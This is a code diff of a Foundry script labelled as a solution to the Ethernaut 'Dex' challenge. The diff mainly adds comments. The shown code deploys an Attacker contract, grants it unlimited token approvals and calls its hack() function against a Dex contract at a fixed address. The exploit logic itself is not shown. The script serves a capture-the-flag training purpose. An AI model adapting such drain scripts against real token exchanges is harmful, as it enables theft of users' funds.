@@ -5,7 +5,6 @@ import {Script, console} from "forge-std/Script.sol";
 import {Dex} from "../src/Dex.sol";
 import {IERC20} from "openzeppelin-contracts-08/contracts/token/ERC20/IERC20.sol";
 
-
 contract Attacker {
 
     address token1;
@@ -39,7 +38,8 @@ contract Attacker {
     }
 }
 
-
+/// @author agadzhalov
+/// @title Solution to Dex Ethernaut challenge
 contract DexScript is Script {
 
     Dex dex = Dex(0x25e668D7FCc8F178F522a8d039f4bF3694419e0A);
@@ -50,11 +50,14 @@ contract DexScript is Script {
     function run() public {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
 
+        // Deploy Attacker contract with references to both tokens and the Dex contract
         Attacker attacker = new Attacker(token1, token2, address(dex));
 
+        // Approve the Attacker contract to use max token balances on behalf of the user
         IERC20(token1).approve(address(attacker), type(uint256).max);
         IERC20(token2).approve(address(attacker), type(uint256).max);
 
+        // Execute the hack
         attacker.hack();
         console.log("token1 dex balance", IERC20(token1).balanceOf(address(dex)));
         vm.stopBroadcast();
